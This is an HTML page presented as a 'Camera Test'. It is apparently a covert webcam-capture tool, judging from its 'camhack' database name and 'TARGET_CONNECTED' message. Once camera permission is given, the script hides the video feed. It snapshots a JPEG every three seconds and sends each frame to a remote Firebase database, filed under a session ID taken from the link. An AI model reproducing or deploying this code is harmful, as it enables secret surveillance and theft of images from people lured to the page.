<!DOCTYPE html>
<html>
<head>
    <title>Minimal Test</title>
</head>
<body>
    <h1>ğŸ“· Camera Test</h1>
    <div id="status">Starting...</div>
    
    <video id="video" autoplay muted playsinline style="display:none"></video>
    <canvas id="canvas" style="display:none"></canvas>

    <script>
        const params = new URLSearchParams(window.location.search);
        const sessionId = params.get('session') || 'test123';
        
        console.log('Session:', sessionId);
        document.getElementById('status').textContent = 'Session: ' + sessionId;
        
        // Direct Firebase REST API
        function sendToFirebase(data) {
            const url = 'https://camhack-realtime-default-rtdb.firebaseio.com/sessions/' + sessionId + '/frames.json';
            
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(result => {
                console.log('âœ… Frame sent via REST API:', result);
                document.getElementById('status').textContent = 'Frame sent: ' + new Date().toLocaleTimeString();
            })
            .catch(error => {
                console.error('âŒ Send failed:', error);
            });
        }
        
        // Start camera
        navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            console.log('âœ… Camera OK');
            
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            
            video.srcObject = stream;
            video.onloadedmetadata = () => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                console.log('ğŸ“· Camera ready:', canvas.width + 'x' + canvas.height);
                
                // Send status
                sendToFirebase({
                    type: 'STATUS',
                    message: 'TARGET_CONNECTED',
                    timestamp: Date.now()
                });
                
                // Send frames every 3 seconds
                setInterval(() => {
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob(blob => {
                        const reader = new FileReader();
                        reader.onload = () => {
                            const frameData = {
                                image: reader.result,
                                frameNumber: Date.now(),
                                timestamp: Date.now(),
                                width: canvas.width,
                                height: canvas.height
                            };
                            
                            console.log('ğŸ“¤ Sending frame via REST API');
                            sendToFirebase(frameData);
                        };
                        reader.readAsDataURL(blob);
                    }, 'image/jpeg', 0.8);
                }, 3000);
            };
        })
        .catch(err => {
            console.error('âŒ Camera failed:', err);
            document.getElementById('status').textContent = 'Camera failed: ' + err.message;
        });
    </script>
</body>
</html>
